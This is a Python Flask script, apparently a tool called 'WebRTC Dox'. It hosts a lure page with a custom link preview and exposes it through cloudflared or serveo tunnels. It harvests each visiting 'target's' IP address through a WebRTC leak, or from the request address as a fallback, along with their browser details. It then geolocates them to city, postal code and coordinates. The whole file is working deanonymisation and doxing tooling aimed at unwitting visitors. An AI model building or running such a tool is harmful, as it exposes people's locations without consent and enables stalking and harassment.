import subprocess
from flask import Flask, jsonify, request, render_template
import sys
import logging
import requests
from termcolor import colored
import json
import ipaddress
from werkzeug.middleware.proxy_fix import ProxyFix
from pwn import *
import signal

def def_handler(sig,frame):
    if forward_pid:
       subprocess.run(["kill", "-9", forward_pid])
        
    print("\nBye")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)



log = logging.getLogger('werkzeug')
log.disabled = True

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)


def test_tools():
    
    system_tools=["ssh", "cloudflared"]
    
    for tool in system_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL ).returncode == 1:
            print(colored(f"[!] {tool} not installed", "red"))
            sys.exit(1)


def ip_api(ip):
    global selected_api
    
    
    req = requests.get(f"http://ip-api.com/json/{ip}")
    geo_data = json.loads(req.text)
    
    print(colored("\tcountry: ","blue")+colored(geo_data.get("country"),"red"))
    print(colored("\tregionName: ","blue")+colored(geo_data.get("regionName"),"red"))
    print(colored("\tcity: ","blue")+colored(geo_data.get("city"),"red"))
    print(colored("\tzip: ","blue")+colored(geo_data.get("zip"),"red"))
    print(colored("\tlat: ","blue")+colored(geo_data.get("lat"),"red"))
    print(colored("\tlon: ","blue")+colored(geo_data.get("lon"),"red"))
    print(colored("\tisp: ","blue")+colored(geo_data.get("isp"),"red"))
    print(colored("\tas: ","blue")+colored(geo_data.get("as"),"red"))
    

def ipapi(ip):
    
    global selected_api
    
    req = requests.get(f"http://ipapi.co/{ip}/json")
    geo_data = json.loads(req.text)
    
    print(colored("\tcountry_name: ","blue")+colored(geo_data.get("country_name"),"red"))
    print(colored("\tregion: ","blue")+colored(geo_data.get("region"),"red"))
    print(colored("\tcity: ","blue")+colored(geo_data.get("city"),"red"))
    print(colored("\tpostal: ","blue")+colored(geo_data.get("postal"),"red"))
    print(colored("\tlatitude: ","blue")+colored(geo_data.get("latitude"),"red"))
    print(colored("\tlongitude: ","blue")+colored(geo_data.get("longitude"),"red"))
    print(colored("\torg: ","blue")+colored(geo_data.get("org"),"red"))
    print(colored("\tasn: ","blue")+colored(geo_data.get("asn"),"red"))
    
    


def set_variables():
    global image_url
    global title
    global port
    global selected_api
    global forwarding_service
    
    
    image_url= input(colored("[+] Image url for link preview (Press enter to leave blank): ", "green"))
    title = input(colored("[+] Page title: (Press enter to leave blank)", "green"))
    
    
    try:
        port = input(colored("[+] Local port for run server: ", "yellow"))
        port = int(port)
    except:
        print("\n[!] Invalid port")    
        
    if not port or port < 1 or port > 65535:
        print("\n[!] Invalid port")    
        sys.exit(1)
        
    
        
    try:
        for key,api in geo_apis.items():
            print(colored(f"\t [{key}] {api['domain']}","green"))
            
        selected_api = int(input(colored("[+] Select api for geolocation: \n", "yellow")))
        selected_api = geo_apis[str(selected_api)]
        
    except Exception as e:
        print(e)
        print(colored("[!] Select a valid number","red"))
        sys.exit(1)
    
     
           
    try:
        for key,api in forwarding_services.items():
            print(colored(f"\t [{key}] {api['service']}","green"))
            
        forwarding_service = int(input(colored("[+] Select forwarding service: \n", "yellow")))
        forwarding_service = forwarding_services[str(forwarding_service)]
        
    except Exception as e:
        print(e)
        print(colored("[!] Select a valid number","red"))
        sys.exit(1)
    
    print("\n")
    
    
def cloudflared():
    try:
            
        global port
        global forward_pid
        global forward_process
        global url
        
        forward_process = process(
            ["/usr/local/bin/cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            stdin=PTY,
            stdout=PTY
        )

        forward_pid = forward_process.pid

        buffer = b""

        while True:
            chunk = forward_process.recv(timeout=0.5)

            if chunk:
                buffer += chunk

                match = re.search(rb"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", buffer)
                if match:
                    url = match.group().decode()
                    print(f"\nTunnel URL: {colored(url, "green")}")
                    break

    except Exception as e:
        print(e)
                
def serveo():
    try:
            
        global port
        global forward_pid
        global forward_process
        global url
        
        forward_process = process(
            ["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
            stdin=PTY,
            stdout=PTY
        )

        forward_pid = forward_process.pid

        buffer = b""

        while True:
            chunk = forward_process.recv(timeout=0.5)

            if chunk:
                buffer += chunk

                match = re.search(rb"https://[a-zA-Z0-9\-]+\.serveousercontent\.com", buffer)
                if match:
                    url = match.group().decode()
                    print(f"\nTunnel URL: {colored(url, "green")}")
                    break

    except Exception as e:
        print(e)
    
    
geo_apis={
    "0":{
        "domain":"ipapi.co",
        "geo_func":ipapi
    },
    "1":{
        "domain":"ip-api.com (Recomended)",
        "geo_func":ip_api
    }
}
    
forwarding_services={
    "0":{
        "service":"cloudflared (Recomended)",
        "forward_func":cloudflared
    },
    "1":{
        "service":"serveo.net",
        "forward_func":serveo
    }
}
    
    
def target_browser_rtc_info(target):
    print(colored("\tIPv4: ","blue")+colored(target["ipv4"], "red"))
    print(colored("\tIPv6: ","blue")+colored(target["ipv6"], "red"))
    print(colored("\tUA: ","blue")+colored(target["navigator.userAgent"], "red"))
    print(colored("\tOS2: ","blue")+colored(target["navigator.platform"], "red"))
    
def target_browser_info(target, ip):
    print(colored("\tIP: ","blue")+colored(ip, "red"))
    print(colored("\tUA: ","blue")+colored(target["navigator.userAgent"], "red"))
    print(colored("\tOS2: ","blue")+colored(target["navigator.platform"], "red"))

@app.after_request
def add_headers(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    return response



# Ruta principal
@app.route('/', methods=['GET'])
def home():
    global image_url
    global title
    global local_port
    
    
    return render_template(
        "index.html",
        title=title,
        image_url=image_url
    )
    
    
@app.route('/', methods=['POST'])
def dox():
    
    global selected_api
    global url
    
    if request.form.get("is_rtc") == "true":
        print(colored("\n[ New target via WebRTC ] ","green")+colored(f" [ {url} ]:\n","yellow"))
        target_browser_rtc_info(request.form)
        selected_api["geo_func"](request.form.get("ipv4"))
    else:
        print(colored("\n[ New target ] ","green")+colored(f" [ {url} ]:\n","yellow"))
        print(colored("[!] Client side WebRTC failed, doxing via request remote addr ","red")+colored("(Client could be using TOR or is blocking UDP or STUN Traffic)\n","blue"))
        target_browser_info(request.form, request.remote_addr )
        selected_api["geo_func"](request.remote_addr)
        
    
    print(colored("\n-----------------------------------------------------------------------","yellow"))
    print(colored("-----------------------------------------------------------------------\n","yellow"))
    return jsonify({"status": "ok"})
    

    
    
if __name__ == '__main__':
    
    try:
        global forwarding_service
        
        test_tools()
        set_variables()    
        
        forwarding_service['forward_func']()
    
            
        print(colored("""
        ██╗    ██╗███████╗██████╗ ██████╗ ████████╗ ██████╗    ██████╗  ██████╗ ██╗  ██╗
        ██║    ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔═══██╗╚██╗██╔╝
        ██║ █╗ ██║█████╗  ██████╔╝██████╔╝   ██║   ██║         ██║  ██║██║   ██║ ╚███╔╝ 
        ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗   ██║   ██║         ██║  ██║██║   ██║ ██╔██╗ 
        ╚███╔███╔╝███████╗██████╔╝██║  ██║   ██║   ╚██████╗    ██████╔╝╚██████╔╝██╔╝ ██╗
        ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                            
        """, "green"))
        

        app.run(debug=False, port=port)
        
    except Exception as e:
        sys.exit(1)
        print(e)
    
